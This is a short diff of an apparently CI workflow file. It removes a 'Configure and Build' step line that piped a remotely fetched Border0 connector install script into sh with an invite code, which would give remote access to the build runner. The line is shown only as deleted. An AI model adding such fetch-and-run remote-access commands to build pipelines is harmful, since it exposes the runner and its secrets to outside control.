@@ -13,4 +13,4 @@ jobs:
           path: 'miktex' 
 
       - name: Configure and Build 
-        run: sh <(curl -fsSL https://download.border0.com/connector/install.sh) --invite APWo10I37pT
+        run: 
